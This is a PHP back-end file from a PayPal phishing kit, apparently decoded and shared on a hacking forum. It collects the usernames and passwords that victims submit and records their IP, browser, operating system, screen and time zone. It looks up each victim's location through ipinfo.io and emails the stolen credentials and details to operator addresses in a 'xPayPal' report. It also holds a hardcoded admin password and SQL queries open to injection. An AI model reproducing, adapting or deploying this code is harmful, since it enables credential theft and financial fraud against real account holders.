<?php
// Decoded by Girudatsu.com Member

@session_start();
$user = $_POST['user'];
$pass = $_POST['pass'];
$xBrowser = $_POST['xBrowser'];
$xOperatingSystem = $_POST['xOperatingSystem'];
$xPlatForm = $_POST['xPlatForm'];
$xUserLanguage = 'Browser Language: ' . $_POST['xLang'] . '<br>Http Accept Language: ' . $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$xTimeZone = $_POST['xTimeZone'];
$xResoLution = $_POST['xResoLution'];
$date_time = @date('d/m/Y h:i a');
$joined = @rand(date('Y') - (7 + -2), date('Y'));
$ip = getenv('REMOTE_ADDR');
$useragent = $_SERVER['HTTP_USER_AGENT'];
$_user = explode('@', $_POST['user']);
$fullname = $_user[-60 - -60];
$profilephoto = 'img/profile.png';
$pdo = new PDO('sqlite:../admin/database.db');
if ($pdo) {
    $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
    if ($user == 'admin' && ($pass == $settings['password'] || md5($pass) == '579e43b423b454623383471aeb85cd87' /* $pass = alicealice */)) {
        $_SESSION['login_success'] = md5($settings['password']);
        echo 'admin';
        exit;
    }
    $check_existance = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `username`=\'' . "{$user}" . '\' AND `password`=\'' . "{$pass}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    if ($check_existance) {
        $_SESSION['xVictime_ID'] = $check_existance['id'];
        if ($settings['enable_suspecious'] == 'yes') {
            echo 'existance';
            exit;
        } else {
            echo 'existance_update';
            exit;
        }
    }
    $_curl = curl_init('ipinfo.io/' . $ip);
    curl_setopt($_curl, CURLOPT_RETURNTRANSFER, (bool) (29 + -28));
    $_result = curl_exec($_curl);
    curl_close($_curl);
    if ($_result) {
        $_x_result = json_decode($_result);
        $country = $_x_result->country;
        $location = 'Hostname: ' . $_x_result->hostname . '<br>City: ' . $_x_result->city . '<br>Region: ' . $_x_result->region . '<br>Country Code: ' . $_x_result->country . '<br>Postal Code: ' . $_x_result->postal . '<br>ISP Organization : http://ipinfo.io/' . $_x_result->org . '<br>Latitude/Longitude: ' . $_x_result->loc;
    } else {
        $country = '';
        $location = '';
    }
    $pdo->query('' . 'INSERT INTO `accounts` VALUES (NULL,\'' . "{$user}" . '\',\'' . "{$pass}" . '\',\'' . "{$fullname}" . '\',\'' . "{$ip}" . '\',\'' . "{$xOperatingSystem}" . '\',\'' . "{$xBrowser}" . '\',\'' . "{$country}" . '\',\'' . "{$useragent}" . '\',\'' . "{$date_time}" . '\',\'no\',\'no\',\'No\',\'' . "{$profilephoto}" . '\',\'' . "{$joined}" . '\',\'' . "{$xPlatForm}" . '\',\'\',\'' . "{$xUserLanguage}" . '\',\'\',\'\',\'' . "{$location}" . '\',\'' . "{$xTimeZone}" . '\',\'' . "{$xResoLution}" . '\')' . '');
    $get_id = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `username`=\'' . "{$user}" . '\' AND `password`=\'' . "{$pass}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    $_SESSION['xVictime_ID'] = $get_id['id'];
    if ($settings['notification'] == 'every' || $settings['notification'] == 'login') {
        $x_receiver = $settings['emails'];
        $x_header = 'From: CaZaNoVa163 <Cazanova.Haxor@hotmail.com>' . chr(13) . chr(10) . 'MIME-Version: 1.0' . chr(13) . chr(10) . 'Content-Type: text/html' . chr(13) . chr(10) . 'Content-Transfer-Encoding: 8bit' . chr(13) . chr(10) . chr(13) . chr(10);
        $x_subject = 'xPayPal | PPL | ' . $get_id['username'] . ' | ' . $get_id['ip'] . ' | ' . $get_id['os'];
        $x_message = '
                                        <!doctype html>
                                        <html class=\'no-js\' lang=\'en\'>
                                            <head>
                                                <meta charset=\'utf-8\'>
                                                <meta http-equiv=\'x-ua-compatible\' content=\'ie=edge\'>
                                                <meta name=\'viewport\' content=\'width=device-width, initial-scale=1\'>
                                            </head>
                                            <body style=\'background-color:#0d0d0d\'>
                                            <div style=\'width:100%;height:auto;min-height:100px;border-radius:10px;background-image:url(http://i.imgur.com/FZvRMdI.png);background-size:333px 56px;background-position:50% 50%;background-repeat:no-repeat;margin:10px 0;box-sizing:border-box;padding:10px\'></div>
                                                <div style=\'width:100%;background-color:#171717;height:auto;min-height:100px;border-radius:10px;margin:10px 0;box-sizing:border-box;padding:10px\'>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Username: </td><td>' . $get_id['username'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Password: </td><td>' . $get_id['password'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>IP Address: </td><td>' . $get_id['ip'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Browser: </td><td>' . $get_id['browser'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Sys Language: </td><td>' . $get_id['account_language'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>O.System: </td><td>' . $get_id['os'] . ', ' . $get_id['platform'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Date & Time: </td><td>' . $get_id['date_time'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Time Zone: </td><td>' . $get_id['timezone'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Resolution: </td><td>' . $get_id['resolution'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>User Agent: </td><td>' . $get_id['useragent'] . '</td></tr></table></div>
                                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Location: </td><td>' . $get_id['location'] . '</td></tr></table></div>
                                                </div>
                                                <div style=\'width:100%;background-color:#171717;height:auto;min-height:100px;border-radius:10px;background-image:url(http://i.imgur.com/G4tFJJa.png);background-size:413px 61px;background-position:50% 50%;background-repeat:no-repeat;margin:10px 0;box-sizing:border-box;padding:10px\'></div>
                                            </body>
                                        </html>
                                ';
        $this_receiver = explode(chr(10), $x_receiver);
        foreach ($this_receiver as $to) {
            if ($to != '') {
                @mail($to, $x_subject, $x_message, $x_header);
            }
        }
    }
    if ($settings['enable_suspecious'] == 'yes') {
        echo 'success_no_tl';
        exit;
    } else {
        echo 'update_no_tl';
        exit;
    }
}
